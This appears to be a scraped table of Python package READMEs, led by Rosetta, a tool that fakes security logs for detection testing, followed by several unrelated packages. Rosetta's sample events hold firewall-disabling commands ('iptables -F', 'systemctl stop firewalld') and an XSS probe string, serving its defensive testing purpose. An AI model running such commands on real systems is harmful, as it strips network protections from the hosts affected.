```sh
git clone https://github.com/ayman-m/rosetta.git
cd rosetta
python setup.py install
```
- Once installed, you can import the library in your Python code like this:
```python
from rosetta import Observables, Events
```

## Usage
Here are some examples of how to use Rosetta:
```python
from rosetta import Converter, ConverterToEnum, ConverterFromEnum, Events, ObservableType, ObservableKnown, \
    Observables, Sender, WorkerTypeEnum

# Example usage of the Converter class to convert a CEF log into a LEEF log.
converted_log = Converter.convert(from_type=ConverterFromEnum.CEF, to_type=ConverterToEnum.LEEF,
                                  data=""cef_log=CEF:0|Security|Intrusion Detection System|1.0|Alert|10|src=192.168.0.1 dst=192.168.0.2 act=blocked"")
print(
    converted_log)  # {'message': 'converted', 'data': 'LEEF=1.0!Vendor=Security!Product=Intrusion Detection System!Version=1.0!EventID=Alert!Name=10!src=192.168.0.1!dst=192.168.0.2!act=blocked'}

# Example usage of the Observables class to generate bad IP indicators.
bad_ip = Observables.generator(count=2, observable_type=ObservableType.IP, known=ObservableKnown.BAD)
print(bad_ip)  # ['ip1', 'ip2']

# Example usage of the Observables class to generate good IP indicators.
good_ip = Observables.generator(count=2, observable_type=ObservableType.IP, known=ObservableKnown.GOOD)
print(good_ip)  # ['ip1', 'ip2']

# Example usage of the Observables class to generate bad URL indicators.
bad_url = Observables.generator(count=2, observable_type=ObservableType.URL, known=ObservableKnown.BAD)
print(bad_url)  # ['url1', 'url2']

# Example usage of the Observables class to generate good URL indicators.
good_url = Observables.generator(count=2, observable_type=ObservableType.URL, known=ObservableKnown.GOOD)
print(good_url)  # ['url1', 'url2']

# Example usage of the Observables class to generate bad Hash indicators.
bad_hash = Observables.generator(count=2, observable_type=ObservableType.SHA256, known=ObservableKnown.BAD)
print(bad_hash)  # ['hash1', 'hash2']

# Example usage of the Observables class to generate good Hash indicators.
good_hash = Observables.generator(count=2, observable_type=ObservableType.SHA256, known=ObservableKnown.GOOD)
print(good_hash)  # ['hash1', 'hash2']

# Example usage of the Observables class to generate CVE indicators.
cve = Observables.generator(count=2, observable_type=ObservableType.CVE)
print(cve)  # Example: ['CVE-2023-2136', 'CVE-2023-29582']

# Example usage of the Observables class to generate random Terms.
terms = Observables.generator(count=2, observable_type=ObservableType.TERMS)
print(terms)  # Example: ['Create or Modify System Process', 'Stage Capabilities: Drive-by Target']


# You can create an instance of the Observables class to contain your own observables that are to be used in the fake security events
src_ip, dst_ip, src_host, dst_host = [""192.168.10.10"", ""192.168.10.20""], [""1.1.1.1"", ""1.1.1.2""], [""abc""], [""xyz"", ""wlv""]
url, port = [""https://example.org"", ""https://wikipedia.com""], [""555"", ""666""]
protocol, app = [""ftp"", ""dns"", ""ssl""], [""explorer.exe"", ""chrome.exe""]
user = [""ayman"", ""mahmoud""]
file_name, file_hash = [""test.zip"", ""image.ps""], [""719283fd5600eb631c23b290530e4dac9029bae72f15299711edbc800e8e02b2""]
cmd, process = [""sudo restart"", ""systemctl stop firewalld""], [""bind"", ""crond""]
severity = [""high"", ""critical""]
sensor = [""fw"", ""edr""]
action = [""block"", ""allow""]
observables_list = Observables(src_ip=src_ip, dst_ip=dst_ip, src_host=src_host, dst_host=dst_host, url=url, port=port,
                               protocol=protocol, app=app, user=user, file_name=file_name, file_hash=file_hash, cmd=cmd,
                               process=process, severity=severity, sensor=sensor, action=action)

# Example usage of the Events class to generate generic SYSLOG events.
generic_syslog_with_random_observables = Events.syslog(count=1)
print(generic_syslog_with_random_observables)  # ['Jan 20 16:04:53 db-88.zuniga.net sudo[34675]: ryansandy : COMMAND ; iptables -F']
generic_syslog_with_my_observables = Events.syslog(count=1, observables=observables_list)
print(generic_syslog_with_my_observables)  # ['Apr 07 10:21:43 abc crond[17458]: ayman : COMMAND ; sudo restart']


# Example usage of the Events class to generate CEF events.
generic_cef_with_my_observables = Events.cef(count=1, observables=observables_list)
print(generic_cef_with_my_observables)  # ['CEF:0|Novak LLC|Firewall|1.0.6|3019ab69-2d0e-4b3f-a240-4e8c93042dc3|Firewall allow dns traffic from abc:33504 to 1.1.1.1:666|5|src=abc spt=33504 dst=1.1.1.1 url=https://example.org dpt=666 proto=dns act=allow']


leef_with_my_observables = Events.leef(count=1, observables=observables_list)
print(leef_with_my_observables)  # [""LEEF:1.0|Leef|Payment Portal|1.0|210.12.108.86|abc|9a:1e:9d:00:4c:ba|3b:a0:4b:24:f7:59|src=192.168.10.10 dst=abc spt=61549 dpt=443 request=https://example.com/search.php?q=<script>alert('xss')</script> method=Web-GET proto=HTTP/1.1 status=500 hash=719283fd5600eb631c23b290530e4dac9029bae72f15299711edbc800e8e02b2request_size=6173 response_size=8611 user_agent=Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_5 like Mac OS X) AppleWebKit/536.1 (KHTML, like Gecko) FxiOS/12.1s4879.0 Mobile/00Y135 Safari/536.1""]

winevent_with_my_observables = Events.winevent(count=1, observables=observables_list)
print(winevent_with_my_observables)  # ['<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event""><System><Provider Name=""Microsoft-Windows-Security-Auditing"" Guid=""5fc4a88c-97b0-4061-adc3-052159c10ef4""/><EventID>4648</EventID><Version>0</Version><Level>0</Level><Task>13824</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime=""2023-04-07T18:45:17""/><EventRecordID>575</EventRecordID><Correlation/><Execution ProcessID=""1071"" ThreadID=""5317"" Channel=""Security""/><Computer>abc</Computer><Security UserID=""S-1-2915""/><EventData><Data Name=""SubjectUserSid"">S-1-2915</Data><Data Name=""SubjectUserName"">mahmoud</Data><Data Name=""SubjectDomainName"">johnson.org</Data><Data Name=""SubjectLogonId"">S-1-2915</Data><Data Name=""NewProcessId"">3371</Data><Data Name=""ProcessId"">1071</Data><Data Name=""CommandLine"">sudo restart</Data><Data Name=""TargetUserSid"">S-1-2915</Data><Data Name=""TargetUserName"">mahmoud</Data><Data Name=""TargetDomainName"">johnson.org</Data><Data Name=""TargetLogonId"">S-1-2915</Data><Data Name=""LogonType"">3</Data></EventData></Event>']

json_with_my_observables = Events.json(count=1, observables=observables_list)
print(json_with_my_observables) # [{'event_type': 'vulnerability_discovered', 'timestamp': '2023-02-12T16:28:46', 'severity': 'high', 'host': 'abc', 'file_hash': '719283fd5600eb631c23b290530e4dac9029bae72f15299711edbc800e8e02b2', 'cve': ['CVE-3941-1955']}]

incident_with_my_observables = Events.incidents(count=1, fields=""id,type,duration,analyst,description,events"", observables=observables_list)
print(incident_with_my_observables) # [{'id': 1, 'duration': 2, 'type': 'Lateral Movement', 'analyst': 'Elizabeth', 'description': 'Software Discovery Forge Web Credentials: SAML Tokens Escape to Host System Binary Proxy Execution: Control Panel Hide Artifacts: Process Argument Spoofing Office Application Startup: Add-ins Compromise Infrastructure: Botnet.', 'events': [{'event': 'Apr 09 19:39:57 abc bind[56294]: ayman : COMMAND ; systemctl stop firewalld'}, {'event': 'CEF:0|Todd, Guzman and Morales|Firewall|1.0.4|afe3d30f-cff4-4084-a7a3-7de9ea21d0e9|Firewall block dns traffic from abc:26806 to 1.1.1.1:555|10|src=abc spt=26806 dst=1.1.1.1 url=https://example.org dpt=555 proto=dns act=block'}, {'event': 'LEEF:1.0|Leef|Payment Portal|1.0|19.90.247.108|abc|d4:27:4c:a7:40:50|2a:3f:f3:37:81:eb|src=192.168.10.20 dst=abc spt=47335 dpt=443 request=https://example.com/index.php method=Web-GET proto=HTTP/1.1 status=500 hash=719283fd5600eb631c23b290530e4dac9029bae72f15299711edbc800e8e02b2request_size=3640 response_size=4766 user_agent=Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_1) AppleWebKit/533.0 (KHTML, like Gecko) Chrome/47.0.819.0 Safari/533.0'}, {'event': '<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event""><System><Provider Name=""Microsoft-Windows-Security-Auditing"" Guid=""67eb0bb0-ab24-43ce-b7f1-6d6a6bb0ac27""/><EventID>4672</EventID><Version>0</Version><Level>0</Level><Task>12544</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime=""2023-01-15T04:07:58""/><EventRecordID>38</EventRecordID><Correlation/><Execution ProcessID=""7182"" ThreadID=""7703"" Channel=""Security""/><Computer>abc</Computer><Security UserID=""S-1-7181""/><EventData><Data Name=""SubjectUserSid"">S-1-7181</Data><Data Name=""SubjectUserName"">mahmoud</Data><Data Name=""SubjectDomainName"">johnson.net</Data><Data Name=""SubjectLogonId"">9638</Data><Data Name=""PrivilegeList"">Through moment tonight.</Data></EventData></Event>'}, {'event': {'event_type': 'vulnerability_discovered', 'timestamp': '2023-01-18T23:49:45', 'severity': 'critical', 'host': 'abc', 'file_hash': '719283fd5600eb631c23b290530e4dac9029bae72f15299711edbc800e8e02b2', 'cve': ['CVE-2023-29067']}}]}]

# Example usage of the Sender class to send faked events to log analysis tool.
worker = Sender(data_type=WorkerTypeEnum.SYSLOG, destination=""udp:127.0.0.1:514"", observables=observables_list, count=5, interval=2)
worker.start()

# Starting worker: worker_2023-04-26 17:50:15.671101
# Worker: worker_2023-04-26 17:50:15.671101 sending log message to 127.0.0.1 
# Worker: worker_2023-04-26 17:50:15.671101 sending log message to 127.0.0.1 
# Worker: worker_2023-04-26 17:50:15.671101 sending log message to 127.0.0.1 
# Worker: worker_2023-04-26 17:50:15.671101 sending log message to 127.0.0.1 
# Worker: worker_2023-04-26 17:50:15.671101 sending log message to 127.0.0.1 

```
","[![snyk](https://snyk.io/test/github/ayman-m/rosetta/badge.svg)](https://snyk.io/test/github/my-soc/Rosetta)
![codeql](https://github.com/ayman-m/rosetta/actions/workflows/github-code-scanning/codeql/badge.svg)
[![slack-community](https://img.shields.io/badge/Slack-4A154C?logo=slack&logoColor=white)](https://go-rosetta.slack.com)

# Rosetta

Rosetta is a Python package that can be used to fake security logs and alerts for testing different detection and response use cases. It provides the following functions:
- Generate bad and random observables/indicators that include IP Addresses, Urls, File hashes , CVE's and more
- Fake log messages in different formats like CEF, LEEF and JSON.
- Convert one log format into another, for example from CEF to LEEF.
- Send the fake log message to different log management and analytics tools.

## Installation

- You can install rosetta via pip:
```sh
pip install rosetta-ce
```
- Or you can install it from the source code:
```sh
git clone https://github.com/ayman-m/rosetta.git
cd rosetta
python setup.py install
```
- Once installed, you can import the library in your Python code like this:
```python
from rosetta import Observables, Events
```

## Usage
Here are some examples of how to use Rosetta:
```python
from rosetta import Converter, ConverterToEnum, ConverterFromEnum, Events, ObservableType, ObservableKnown, \
    Observables, Sender, WorkerTypeEnum

# Example usage of the Converter class to convert a CEF log into a LEEF log.
converted_log = Converter.convert(from_type=ConverterFromEnum.CEF, to_type=ConverterToEnum.LEEF,
                                  data=""cef_log=CEF:0|Security|Intrusion Detection System|1.0|Alert|10|src=192.168.0.1 dst=192.168.0.2 act=blocked"")
print(
    converted_log)  # {'message': 'converted', 'data': 'LEEF=1.0!Vendor=Security!Product=Intrusion Detection System!Version=1.0!EventID=Alert!Name=10!src=192.168.0.1!dst=192.168.0.2!act=blocked'}

# Example usage of the Observables class to generate bad IP indicators.
bad_ip = Observables.generator(count=2, observable_type=ObservableType.IP, known=ObservableKnown.BAD)
print(bad_ip)  # ['ip1', 'ip2']

# Example usage of the Observables class to generate good IP indicators.
good_ip = Observables.generator(count=2, observable_type=ObservableType.IP, known=ObservableKnown.GOOD)
print(good_ip)  # ['ip1', 'ip2']

# Example usage of the Observables class to generate bad URL indicators.
bad_url = Observables.generator(count=2, observable_type=ObservableType.URL, known=ObservableKnown.BAD)
print(bad_url)  # ['url1', 'url2']

# Example usage of the Observables class to generate good URL indicators.
good_url = Observables.generator(count=2, observable_type=ObservableType.URL, known=ObservableKnown.GOOD)
print(good_url)  # ['url1', 'url2']

# Example usage of the Observables class to generate bad Hash indicators.
bad_hash = Observables.generator(count=2, observable_type=ObservableType.SHA256, known=ObservableKnown.BAD)
print(bad_hash)  # ['hash1', 'hash2']

# Example usage of the Observables class to generate good Hash indicators.
good_hash = Observables.generator(count=2, observable_type=ObservableType.SHA256, known=ObservableKnown.GOOD)
print(good_hash)  # ['hash1', 'hash2']

# Example usage of the Observables class to generate CVE indicators.
cve = Observables.generator(count=2, observable_type=ObservableType.CVE)
print(cve)  # Example: ['CVE-2023-2136', 'CVE-2023-29582']

# Example usage of the Observables class to generate random Terms.
terms = Observables.generator(count=2, observable_type=ObservableType.TERMS)
print(terms)  # Example: ['Create or Modify System Process', 'Stage Capabilities: Drive-by Target']


# You can create an instance of the Observables class to contain your own observables that are to be used in the fake security events
src_ip, dst_ip, src_host, dst_host = [""192.168.10.10"", ""192.168.10.20""], [""1.1.1.1"", ""1.1.1.2""], [""abc""], [""xyz"", ""wlv""]
url, port = [""https://example.org"", ""https://wikipedia.com""], [""555"", ""666""]
protocol, app = [""ftp"", ""dns"", ""ssl""], [""explorer.exe"", ""chrome.exe""]
user = [""ayman"", ""mahmoud""]
file_name, file_hash = [""test.zip"", ""image.ps""], [""719283fd5600eb631c23b290530e4dac9029bae72f15299711edbc800e8e02b2""]
cmd, process = [""sudo restart"", ""systemctl stop firewalld""], [""bind"", ""crond""]
severity = [""high"", ""critical""]
sensor = [""fw"", ""edr""]
action = [""block"", ""allow""]
observables_list = Observables(src_ip=src_ip, dst_ip=dst_ip, src_host=src_host, dst_host=dst_host, url=url, port=port,
                               protocol=protocol, app=app, user=user, file_name=file_name, file_hash=file_hash, cmd=cmd,
                               process=process, severity=severity, sensor=sensor, action=action)

# Example usage of the Events class to generate generic SYSLOG events.
generic_syslog_with_random_observables = Events.syslog(count=1)
print(generic_syslog_with_random_observables)  # ['Jan 20 16:04:53 db-88.zuniga.net sudo[34675]: ryansandy : COMMAND ; iptables -F']
generic_syslog_with_my_observables = Events.syslog(count=1, observables=observables_list)
print(generic_syslog_with_my_observables)  # ['Apr 07 10:21:43 abc crond[17458]: ayman : COMMAND ; sudo restart']


# Example usage of the Events class to generate CEF events.
generic_cef_with_my_observables = Events.cef(count=1, observables=observables_list)
print(generic_cef_with_my_observables)  # ['CEF:0|Novak LLC|Firewall|1.0.6|3019ab69-2d0e-4b3f-a240-4e8c93042dc3|Firewall allow dns traffic from abc:33504 to 1.1.1.1:666|5|src=abc spt=33504 dst=1.1.1.1 url=https://example.org dpt=666 proto=dns act=allow']


leef_with_my_observables = Events.leef(count=1, observables=observables_list)
print(leef_with_my_observables)  # [""LEEF:1.0|Leef|Payment Portal|1.0|210.12.108.86|abc|9a:1e:9d:00:4c:ba|3b:a0:4b:24:f7:59|src=192.168.10.10 dst=abc spt=61549 dpt=443 request=https://example.com/search.php?q= method=Web-GET proto=HTTP/1.1 status=500 hash=719283fd5600eb631c23b290530e4dac9029bae72f15299711edbc800e8e02b2request_size=6173 response_size=8611 user_agent=Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_5 like Mac OS X) AppleWebKit/536.1 (KHTML, like Gecko) FxiOS/12.1s4879.0 Mobile/00Y135 Safari/536.1""]

winevent_with_my_observables = Events.winevent(count=1, observables=observables_list)
print(winevent_with_my_observables)  # ['4648001382400x8020000000000000575abcS-1-2915mahmoudjohnson.orgS-1-291533711071sudo restartS-1-2915mahmoudjohnson.orgS-1-29153']

json_with_my_observables = Events.json(count=1, observables=observables_list)
print(json_with_my_observables) # [{'event_type': 'vulnerability_discovered', 'timestamp': '2023-02-12T16:28:46', 'severity': 'high', 'host': 'abc', 'file_hash': '719283fd5600eb631c23b290530e4dac9029bae72f15299711edbc800e8e02b2', 'cve': ['CVE-3941-1955']}]

incident_with_my_observables = Events.incidents(count=1, fields=""id,type,duration,analyst,description,events"", observables=observables_list)
print(incident_with_my_observables) # [{'id': 1, 'duration': 2, 'type': 'Lateral Movement', 'analyst': 'Elizabeth', 'description': 'Software Discovery Forge Web Credentials: SAML Tokens Escape to Host System Binary Proxy Execution: Control Panel Hide Artifacts: Process Argument Spoofing Office Application Startup: Add-ins Compromise Infrastructure: Botnet.', 'events': [{'event': 'Apr 09 19:39:57 abc bind[56294]: ayman : COMMAND ; systemctl stop firewalld'}, {'event': 'CEF:0|Todd, Guzman and Morales|Firewall|1.0.4|afe3d30f-cff4-4084-a7a3-7de9ea21d0e9|Firewall block dns traffic from abc:26806 to 1.1.1.1:555|10|src=abc spt=26806 dst=1.1.1.1 url=https://example.org dpt=555 proto=dns act=block'}, {'event': 'LEEF:1.0|Leef|Payment Portal|1.0|19.90.247.108|abc|d4:27:4c:a7:40:50|2a:3f:f3:37:81:eb|src=192.168.10.20 dst=abc spt=47335 dpt=443 request=https://example.com/index.php method=Web-GET proto=HTTP/1.1 status=500 hash=719283fd5600eb631c23b290530e4dac9029bae72f15299711edbc800e8e02b2request_size=3640 response_size=4766 user_agent=Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_1) AppleWebKit/533.0 (KHTML, like Gecko) Chrome/47.0.819.0 Safari/533.0'}, {'event': '4672001254400x802000000000000038abcS-1-7181mahmoudjohnson.net9638Through moment tonight.'}, {'event': {'event_type': 'vulnerability_discovered', 'timestamp': '2023-01-18T23:49:45', 'severity': 'critical', 'host': 'abc', 'file_hash': '719283fd5600eb631c23b290530e4dac9029bae72f15299711edbc800e8e02b2', 'cve': ['CVE-2023-29067']}}]}]

# Example usage of the Sender class to send faked events to log analysis tool.
worker = Sender(data_type=WorkerTypeEnum.SYSLOG, destination=""udp:127.0.0.1:514"", observables=observables_list, count=5, interval=2)
worker.start()

# Starting worker: worker_2023-04-26 17:50:15.671101
# Worker: worker_2023-04-26 17:50:15.671101 sending log message to 127.0.0.1 
# Worker: worker_2023-04-26 17:50:15.671101 sending log message to 127.0.0.1 
# Worker: worker_2023-04-26 17:50:15.671101 sending log message to 127.0.0.1 
# Worker: worker_2023-04-26 17:50:15.671101 sending log message to 127.0.0.1 
# Worker: worker_2023-04-26 17:50:15.671101 sending log message to 127.0.0.1 

```
",ayman-m/rosetta
jawalang,https://github.com/Arsybai/jawa-language,0,818,804,"# Jawa-Language
Jawa-Language, Programming language for javanese people.
this language is based on python.

### Required
- Python 3.x

### Installation
```shell
> pip3 install jawalang
```
Or clone this repository and 
```shell
> pip3 install -e .
```

## Run
```shell
> jawalang run <your_file.jw>
```

### Syntax Highlighter
Install Visual Studio Code extension
[Jawa-Language-Support](https://marketplace.visualstudio.com/items?itemName=arsybai.jawa-language-support)

### Example
You can find more in `example` folder
```python
a = 0
b = 1

# if a == b
yen a podo karo b:
    nyetak(""podo"")
# elif a != b:
liyane tur a bedo karo b:
    nyetak(""bedo"")
# else
liyane:
    nyetak(""Bedo cuk"")

# Short hand if else
nyetak(""Bedo"") yen a bedo karo b liyane nyetak(""podo"")
```
","# Jawa-Language
Jawa-Language, Programming language for javanese people.
this language is based on python.

### Required
- Python 3.x

### Installation
```shell
> pip3 install jawalang
```
Or clone this repository and 
```shell
> pip3 install -e .
```

## Run
```shell
> jawalang run 
```

### Syntax Highlighter
Install Visual Studio Code extension
[Jawa-Language-Support](https://marketplace.visualstudio.com/items?itemName=arsybai.jawa-language-support)

### Example
You can find more in `example` folder
```python
a = 0
b = 1

# if a == b
yen a podo karo b:
    nyetak(""podo"")
# elif a != b:
liyane tur a bedo karo b:
    nyetak(""bedo"")
# else
liyane:
    nyetak(""Bedo cuk"")

# Short hand if else
nyetak(""Bedo"") yen a bedo karo b liyane nyetak(""podo"")
```
",arsybai/jawa-language
stitchtoon,https://github.com/BishrGhalil/stitchtoon,10,1510,669,"<div align=""center"">
  <h1>Stitch Toon</h1>
  <p>
    A powerful package for stitching and cutting webtoons/manhwa/manhua raws.
  </p>
  <a href=""https://github.com/BishrGhalil/stitchtoon/releases/latest"">
    <img src=""https://img.shields.io/github/v/release/BishrGhalil/stitchtoon"">
  </a>
  <a href=""https://github.com/BishrGhalil/stitchtoon/releases/latest"">
    <img src=""https://img.shields.io/github/release-date/BishrGhalil/stitchtoon"">
  </a>
  <a href=""https://github.com/BishrGhalil/stitchtoon/releases/"">
    <img src=""https://img.shields.io/github/downloads/BishrGhalil/stitchtoon/total"">
  </a>
  <a href=""https://github.com/BishrGhalil/stitchtoon/tree/dev"">
    <img src=""https://img.shields.io/github/last-commit/BishrGhalil/stitchtoon"">
  </a>
  <a href=""https://github.com/BishrGhalil/stitchtoon/blob/dev/LICENSE"">
    <img src=""https://img.shields.io/github/license/BishrGhalil/stitchtoon"">
  </a>
  </div>
 

## New features
- export as archive
- better output naming handling
- size limites for defferent output formats

## Install

Build from source
```
git clone https://github.com/BishrGhalil/stitchtoon
cd stitchtoon
pip instal --user requirements.txt
pip install .
```

## Basic usage
```
stitchtoon -i <input-path> -sh <split-height>
```
Check out `help` for more advanced options
```
stitchtoon --help
```

 
> All thanks to [MechTechnology](https://github.com/MechTechnology) for creating [SmartStitch](https://github.com/BishrGhalil/stitchtoon) which is the base of this package.
","
Stitch Toon

    A powerful package for stitching and cutting webtoons/manhwa/manhua raws.
  
















 

## New features
- export as archive
- better output naming handling
- size limites for defferent output formats

## Install

Build from source
```
git clone https://github.com/BishrGhalil/stitchtoon
cd stitchtoon
pip instal --user requirements.txt
pip install .
```

## Basic usage
```
stitchtoon -i  -sh 
```
Check out `help` for more advanced options
```
stitchtoon --help
```

 
> All thanks to [MechTechnology](https://github.com/MechTechnology) for creating [SmartStitch](https://github.com/BishrGhalil/stitchtoon) which is the base of this package.
",bishrghalil/stitchtoon
sampy-abm,https://github.com/sampy-project/sampy-main,4,77,77,"# sampy-main

This is the main repo containing the last version of SamPy.
","# sampy-main

This is the main repo containing the last version of SamPy.
",sampy-project/sampy-main
nycu-tdx-py,https://github.com/ChiaJung-Yeh/nycu_tdx_py,0,2185,1934,"## Overview

<img src=""./figure/TDX_icon.png"" width=""30%"" style=""display: block; margin: auto;"" />

This package can be used to connect transportation data from TDX
(Transport Data eXchange) in a neat and efficient way in Python. TDX platform is
supported by Ministry of Transportation and Communications (MOTC) in
Taiwan, which provides lots of API for the members download the
transportation data. Before using the function provided in this package,
the authentication key is a must, which can be applied from [TDX
platform](https://tdx.transportdata.tw/register). After being a member
of TDX, you will soon get the Client Id and Client Secret, please check
out in the [API key
Dashboard](https://tdx.transportdata.tw/user/dataservice/key).

If you are R user, please install the packages on Github via `devtools::install_github(""ChiaJung-Yeh/NYCU_TDX"")`,
and all of the functions can be found in  **[TDX
Guide](https://chiajung-yeh.github.io/TDX_Guide/)** website.

## Installation

Please install the package via following pip code.

    pip install nycu-tdx-py

## Usage

Data retrieving process requires an access token to obtain the data from
TDX platform. Every function in this package should use function
`get_token()` to obtain the token by entering your Client ID and Client
Secret first. Note that the access token will expire in 1 day.

Take retrieving bus stops of Taipei City for example. The
code is shown below. Here the argument `client_id` and `client_secret`
is the authentication key applied from TDX.

    from nycu_tdx_py import tdx
    
    # get the access token first
    access_token=tdx.get_token(""CLIENT_ID"", ""CLIEN_SECRET"")

    # retrieve Taipei bus stops
    taipei_bus=tdx.BusStopOfRoute(access_token, ""Taipei"")


## Support

This package takes advantage of API service provided by TDX, MOTC.

<img src=""./figure/TDX.png"" width=""60%"" style=""display: block; margin: auto;"" />

## Contact

For questions, bugs, and other discussion, please feel free to contact
the package maintainer, Chia Jung, Yeh.  
Email:
<a href=""mailto:robert1328.mg10@nycu.edu.tw""><u><robert1328.mg10@nycu.edu.tw></u></a>
","## Overview



This package can be used to connect transportation data from TDX
(Transport Data eXchange) in a neat and efficient way in Python. TDX platform is
supported by Ministry of Transportation and Communications (MOTC) in
Taiwan, which provides lots of API for the members download the
transportation data. Before using the function provided in this package,
the authentication key is a must, which can be applied from [TDX
platform](https://tdx.transportdata.tw/register). After being a member
of TDX, you will soon get the Client Id and Client Secret, please check
out in the [API key
Dashboard](https://tdx.transportdata.tw/user/dataservice/key).

If you are R user, please install the packages on Github via `devtools::install_github(""ChiaJung-Yeh/NYCU_TDX"")`,
and all of the functions can be found in  **[TDX
Guide](https://chiajung-yeh.github.io/TDX_Guide/)** website.

## Installation

Please install the package via following pip code.

    pip install nycu-tdx-py

## Usage

Data retrieving process requires an access token to obtain the data from
TDX platform. Every function in this package should use function
`get_token()` to obtain the token by entering your Client ID and Client
Secret first. Note that the access token will expire in 1 day.

Take retrieving bus stops of Taipei City for example. The
code is shown below. Here the argument `client_id` and `client_secret`
is the authentication key applied from TDX.

    from nycu_tdx_py import tdx
    
    # get the access token first
    access_token=tdx.get_token(""CLIENT_ID"", ""CLIEN_SECRET"")

    # retrieve Taipei bus stops
    taipei_bus=tdx.BusStopOfRoute(access_token, ""Taipei"")


## Support

This package takes advantage of API service provided by TDX, MOTC.



## Contact

For questions, bugs, and other discussion, please feel free to contact
the package maintainer, Chia Jung, Yeh.  
Email:

",chiajung-yeh/nycu_tdx_py
anduryl,https://github.com/grongen/anduryl,0,0,0,,,grongen/anduryl
sfmlearner-installable,https://github.com/topher097/SfMLearner_installable,7,7480,7424,"
# Fork of SfMLearner
This fork is of SfMLearner, nothing changed with it but includes a `setup.py` file so the repo can be installed via pip using the command:
```
pip install SfMLearner-installable
```

# SfMLearner
This codebase implements the system described in the paper:

Unsupervised Learning of Depth and Ego-Motion from Video

[Tinghui Zhou](https://people.eecs.berkeley.edu/~tinghuiz/), [Matthew Brown](http://matthewalunbrown.com/research/research.html), [Noah Snavely](http://www.cs.cornell.edu/~snavely/), [David G. Lowe](http://www.cs.ubc.ca/~lowe/home.html)

In CVPR 2017 (**Oral**).

See the [project webpage](https://people.eecs.berkeley.edu/~tinghuiz/projects/SfMLearner/) for more details. Please contact Tinghui Zhou (tinghuiz@berkeley.edu) if you have any questions.

<img src='misc/cityscapes_sample_results.gif' width=320>

## Prerequisites
This codebase was developed and tested with Tensorflow 1.0, CUDA 8.0 and Ubuntu 16.04.

## Running the single-view depth demo
We provide the demo code for running our single-view depth prediction model. First, download the pre-trained model from this [Google Drive](https://drive.google.com/file/d/1AH5LV29Fijrz_QI3Th6ogtXJKXhd8Nm9/view?usp=sharing), and put the model files under `models/`. Then you can use the provided ipython-notebook `demo.ipynb` to run the demo.

## Preparing training data
In order to train the model using the provided code, the data needs to be formatted in a certain manner. 

For [KITTI](http://www.cvlibs.net/datasets/kitti/raw_data.php), first download the dataset using this [script](http://www.cvlibs.net/download.php?file=raw_data_downloader.zip) provided on the official website, and then run the following command
```bash
python data/prepare_train_data.py --dataset_dir=/path/to/raw/kitti/dataset/ --dataset_name='kitti_raw_eigen' --dump_root=/path/to/resulting/formatted/data/ --seq_length=3 --img_width=416 --img_height=128 --num_threads=4
```
For the pose experiments, we used the KITTI odometry split, which can be downloaded [here](http://www.cvlibs.net/datasets/kitti/eval_odometry.php). Then you can change `--dataset_name` option to `kitti_odom` when preparing the data.

For [Cityscapes](https://www.cityscapes-dataset.com/), download the following packages: 1) `leftImg8bit_sequence_trainvaltest.zip`, 2) `camera_trainvaltest.zip`. Then run the following command
```bash
python data/prepare_train_data.py --dataset_dir=/path/to/cityscapes/dataset/ --dataset_name='cityscapes' --dump_root=/path/to/resulting/formatted/data/ --seq_length=3 --img_width=416 --img_height=171 --num_threads=4
```
Notice that for Cityscapes the `img_height` is set to 171 because we crop out the bottom part of the image that contains the car logo, and the resulting image will have height 128.

## Training
Once the data are formatted following the above instructions, you should be able to train the model by running the following command
```bash
python train.py --dataset_dir=/path/to/the/formatted/data/ --checkpoint_dir=/where/to/store/checkpoints/ --img_width=416 --img_height=128 --batch_size=4
```
You can then start a `tensorboard` session by
```bash
tensorboard --logdir=/path/to/tensorflow/log/files --port=8888
```
and visualize the training progress by opening [https://localhost:8888](https://localhost:8888) on your browser. If everything is set up properly, you should start seeing reasonable depth prediction after ~100K iterations when training on KITTI. 

### Notes
After adding data augmentation and removing batch normalization (along with some other minor tweaks), we have been able to train depth models better than what was originally reported in the paper even without using additional Cityscapes data or the explainability regularization. The provided pre-trained model was trained on KITTI only with smooth weight set to 0.5, and achieved the following performance on the Eigen test split (Table 1 of the paper):

| Abs Rel | Sq Rel | RMSE  | RMSE(log) | Acc.1 | Acc.2 | Acc.3 |
|---------|--------|-------|-----------|-------|-------|-------|
| 0.183   | 1.595  | 6.709 | 0.270     | 0.734 | 0.902 | 0.959 | 

When trained on 5-frame snippets, the pose model obtains the following performanace on the KITTI odometry split (Table 3 of the paper):

| Seq. 09            | Seq. 10            |
|--------------------|--------------------|
| 0.016 (std. 0.009) | 0.013 (std. 0.009) |

## Evaluation on KITTI

### Depth
We provide evaluation code for the single-view depth experiment on KITTI. First, download our predictions (~140MB) from this [Google Drive](https://drive.google.com/file/d/1ERB2vUH_6to8NI9KN-ug-ijcWaQf9SIp/view?usp=sharing) and put them into `kitti_eval/`.

Then run
```bash
python kitti_eval/eval_depth.py --kitti_dir=/path/to/raw/kitti/dataset/ --pred_file=kitti_eval/kitti_eigen_depth_predictions.npy
```
If everything runs properly, you should get the numbers for `Ours(CS+K)` in Table 1 of the paper. To get the numbers for `Ours cap 50m (CS+K)`, set an additional flag `--max_depth=50` when executing the above command.

### Pose
We provide evaluation code for the pose estimation experiment on KITTI. First, download the predictions and ground-truth pose data from this [Google Drive](https://drive.google.com/file/d/1BqTIY_PBRkFvKrFvqlhPsEaouSdo42ZZ/view?usp=sharing).

Notice that all the predictions and ground-truth are 5-frame snippets with the format of `timestamp tx ty tz qx qy qz qw` consistent with the [TUM evaluation toolkit](https://vision.in.tum.de/data/datasets/rgbd-dataset/tools#evaluation). Then you could run 
```bash
python kitti_eval/eval_pose.py --gtruth_dir=/directory/of/groundtruth/trajectory/files/ --pred_dir=/directory/of/predicted/trajectory/files/
```
to obtain the results reported in Table 3 of the paper. For instance, to get the results of `Ours` for `Seq. 10` you could run
```bash
python kitti_eval/eval_pose.py --gtruth_dir=kitti_eval/pose_data/ground_truth/10/ --pred_dir=kitti_eval/pose_data/ours_results/10/
```

## KITTI Testing code

### Depth
